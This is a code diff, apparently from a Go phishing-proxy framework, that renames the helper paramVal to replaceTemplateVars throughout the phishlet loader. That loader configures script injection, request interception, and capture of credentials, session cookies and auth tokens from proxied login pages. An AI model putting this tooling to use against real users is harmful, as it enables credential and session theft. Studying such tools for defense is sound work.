@@ -451,7 +451,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		if ph.AutoFilter != nil {
 			auto_filter = *ph.AutoFilter
 		}
-		p.addProxyHost(p.paramVal(*ph.PhishSub), p.paramVal(*ph.OrigSub), p.paramVal(*ph.Domain), ph.Session, ph.IsLanding, auto_filter)
+		p.addProxyHost(p.replaceTemplateVars(*ph.PhishSub), p.replaceTemplateVars(*ph.OrigSub), p.replaceTemplateVars(*ph.Domain), ph.Session, ph.IsLanding, auto_filter)
 	}
 	if len(p.proxyHosts) == 0 {
 		return fmt.Errorf("proxy_hosts: list cannot be empty")
@@ -502,9 +502,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 
 			for n := range *sf.Mimes {
-				(*sf.Mimes)[n] = p.paramVal((*sf.Mimes)[n])
+				(*sf.Mimes)[n] = p.replaceTemplateVars((*sf.Mimes)[n])
 			}
-			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
+			p.addSubFilter(p.replaceTemplateVars(*sf.Hostname), p.replaceTemplateVars(*sf.Sub), p.replaceTemplateVars(*sf.Domain), *sf.Mimes, p.replaceTemplateVars(*sf.Search), p.replaceTemplateVars(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
 		}
 	}
 	if fp.JsInject != nil {
@@ -523,15 +523,15 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				if (*js.Location != "body" && *js.Location != "head") {
 					return fmt.Errorf("js_inject: unknown location - only 'head' or 'body' are supported")
 				}
-				location = p.paramVal(*js.Location)
+				location = p.replaceTemplateVars(*js.Location)
 			}
 			for n := range *js.TriggerDomains {
-				(*js.TriggerDomains)[n] = p.paramVal((*js.TriggerDomains)[n])
+				(*js.TriggerDomains)[n] = p.replaceTemplateVars((*js.TriggerDomains)[n])
 			}
 			for n := range *js.TriggerPaths {
-				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
+				(*js.TriggerPaths)[n] = p.replaceTemplateVars((*js.TriggerPaths)[n])
 			}
-			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script), location)
+			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.replaceTemplateVars(*js.Script), location)
 			if err != nil {
 				return err
 			}
@@ -550,7 +550,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Path == nil {
 				return fmt.Errorf("intercept: missing `path` field")
 			}
-			path_re, err := regexp.Compile(p.paramVal(*ic.Path))
+			path_re, err := regexp.Compile(p.replaceTemplateVars(*ic.Path))
 			if err != nil {
 				return fmt.Errorf("intercept: `path` invalid regular expression: %v", err)
 			}
@@ -567,7 +567,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Type != nil {
 				stype = *ic.Type
 			}
-			err = p.addIntercept(p.paramVal(*ic.Domain), path_re, *ic.HttpStatus, p.paramVal(body), mime, stype)
+			err = p.addIntercept(p.replaceTemplateVars(*ic.Domain), path_re, *ic.HttpStatus, p.replaceTemplateVars(body), mime, stype)
 			if err != nil {
 				return err
 			}
@@ -591,9 +591,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 
 			for n := range *at.Keys {
-				(*at.Keys)[n] = p.paramVal((*at.Keys)[n])
+				(*at.Keys)[n] = p.replaceTemplateVars((*at.Keys)[n])
 			}
-			err := p.addCookieAuthTokens(p.paramVal(*at.Domain), *at.Keys)
+			err := p.addCookieAuthTokens(p.replaceTemplateVars(*at.Domain), *at.Keys)
 			if err != nil {
 				return err
 			}
@@ -611,7 +611,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				return fmt.Errorf("auth_tokens: 'search' not found for body auth token")
 			}
 
-			err := p.addBodyAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Search))
+			err := p.addBodyAuthToken(p.replaceTemplateVars(*at.Domain), p.replaceTemplateVars(*at.Path), p.replaceTemplateVars(*at.Name), p.replaceTemplateVars(*at.Search))
 			if err != nil {
 				return err
 			}
@@ -633,14 +633,14 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if at.Subtype != nil {
 				stype = *at.Subtype
 			}
-			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header), stype)
+			err := p.addHttpAuthToken(p.replaceTemplateVars(*at.Domain), p.replaceTemplateVars(*at.Path), p.replaceTemplateVars(*at.Name), p.replaceTemplateVars(*at.Header), stype)
 			if err != nil {
 				return err
 			}
 		}
 	}
 	for _, au := range fp.AuthUrls {
-		re, err := regexp.Compile(p.paramVal(au))
+		re, err := regexp.Compile(p.replaceTemplateVars(au))
 		if err != nil {
 			return err
 		}
@@ -660,22 +660,22 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		return fmt.Errorf("credentials: missing password `search` field")
 	}
 
-	p.username.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Key))
+	p.username.key, err = regexp.Compile(p.replaceTemplateVars(*fp.Credentials.Username.Key))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.username.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Search))
+	p.username.search, err = regexp.Compile(p.replaceTemplateVars(*fp.Credentials.Username.Search))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.password.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Key))
+	p.password.key, err = regexp.Compile(p.replaceTemplateVars(*fp.Credentials.Password.Key))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
 
-	p.password.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Search))
+	p.password.search, err = regexp.Compile(p.replaceTemplateVars(*fp.Credentials.Password.Search))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
 	}
@@ -688,8 +688,8 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if p.password.tp == "" {
 		p.password.tp = "post"
 	}
-	p.username.key_s = p.paramVal(*fp.Credentials.Username.Key)
-	p.password.key_s = p.paramVal(*fp.Credentials.Password.Key)
+	p.username.key_s = p.replaceTemplateVars(*fp.Credentials.Username.Key)
+	p.password.key_s = p.replaceTemplateVars(*fp.Credentials.Password.Key)
 
 	if fp.LoginItem.Domain == nil {
 		return fmt.Errorf("login: missing `domain` field")
@@ -697,7 +697,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if fp.LoginItem.Path == nil {
 		return fmt.Errorf("login: missing `path` field")
 	}
-	p.login.domain = p.paramVal(*fp.LoginItem.Domain)
+	p.login.domain = p.replaceTemplateVars(*fp.LoginItem.Domain)
 	if p.login.domain == "" {
 		return fmt.Errorf("login: `domain` field cannot be empty")
 	}
@@ -717,7 +717,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		return fmt.Errorf("login: `domain` must contain a value of one of the hostnames (`orig_subdomain` + `domain`) defined in `proxy_hosts` section")
 	}
 
-	p.login.path = p.paramVal(*fp.LoginItem.Path)
+	p.login.path = p.replaceTemplateVars(*fp.LoginItem.Path)
 	if p.login.path == "" {
 		p.login.path = "/"
 	}
@@ -735,11 +735,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				return fmt.Errorf("credentials: missing custom `search` field")
 			}
 			o := PostField{}
-			o.key, err = regexp.Compile(p.paramVal(*cp.Key))
+			o.key, err = regexp.Compile(p.replaceTemplateVars(*cp.Key))
 			if err != nil {
 				return fmt.Errorf("credentials: %v", err)
 			}
-			o.search, err = regexp.Compile(p.paramVal(*cp.Search))
+			o.search, err = regexp.Compile(p.replaceTemplateVars(*cp.Search))
 			if err != nil {
 				return err
 			}
@@ -747,7 +747,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if o.tp == "" {
 				o.tp = "post"
 			}
-			o.key_s = p.paramVal(*cp.Key)
+			o.key_s = p.replaceTemplateVars(*cp.Key)
 			p.custom = append(p.custom, o)
 		}
 	}
@@ -770,7 +770,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 
 			fpf := ForceGet{}
-			fpf.path, err = regexp.Compile(p.paramVal(*op.Path))
+			fpf.path, err = regexp.Compile(p.replaceTemplateVars(*op.Path))
 			if err != nil {
 				return err
 			}
@@ -786,11 +786,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 					}
 
 					f_s := ForceGetSearch{}
-					f_s.key, err = regexp.Compile(p.paramVal(*op_s.Key))
+					f_s.key, err = regexp.Compile(p.replaceTemplateVars(*op_s.Key))
 					if err != nil {
 						return err
 					}
-					f_s.search, err = regexp.Compile(p.paramVal(*op_s.Search))
+					f_s.search, err = regexp.Compile(p.replaceTemplateVars(*op_s.Search))
 					if err != nil {
 						return err
 					}
@@ -806,8 +806,8 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				}
 
 				f_f := ForceGetForce{
-					key:   p.paramVal(*op_f.Key),
-					value: p.paramVal(*op_f.Value),
+					key:   p.replaceTemplateVars(*op_f.Key),
+					value: p.replaceTemplateVars(*op_f.Value),
 				}
 				fpf.force = append(fpf.force, f_f)
 			}
@@ -829,7 +829,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 
 			fpf := ForcePost{}
-			fpf.path, err = regexp.Compile(p.paramVal(*op.Path))
+			fpf.path, err = regexp.Compile(p.replaceTemplateVars(*op.Path))
 			if err != nil {
 				return err
 			}
@@ -845,11 +845,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 					}
 
 					f_s := ForcePostSearch{}
-					f_s.key, err = regexp.Compile(p.paramVal(*op_s.Key))
+					f_s.key, err = regexp.Compile(p.replaceTemplateVars(*op_s.Key))
 					if err != nil {
 						return err
 					}
-					f_s.search, err = regexp.Compile(p.paramVal(*op_s.Search))
+					f_s.search, err = regexp.Compile(p.replaceTemplateVars(*op_s.Search))
 					if err != nil {
 						return err
 					}
@@ -874,9 +874,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				}
 
 				f_f := ForcePostForce{
-					key:   p.paramVal(*op_f.Key),
-					value: p.paramVal(*op_f.Value),
-					tp:    p.paramVal(tp),
+					key:   p.replaceTemplateVars(*op_f.Key),
+					value: p.replaceTemplateVars(*op_f.Value),
+					tp:    p.replaceTemplateVars(tp),
 				}
 				fpf.force = append(fpf.force, f_f)
 			}
@@ -887,7 +887,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if fp.LandingPath != nil {
 		p.landing_path = *fp.LandingPath
 		for n := range p.landing_path {
-			p.landing_path[n] = p.paramVal(p.landing_path[n])
+			p.landing_path[n] = p.replaceTemplateVars(p.landing_path[n])
 		}
 	}
 	return nil
@@ -1232,7 +1232,7 @@ func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
 	return ret, nil
 }
 
-func (p *Phishlet) paramVal(s string) string {
+func (p *Phishlet) replaceTemplateVars(s string) string {
 	var ret string = s
 	if !p.isTemplate {
 		for k, v := range p.customParams {
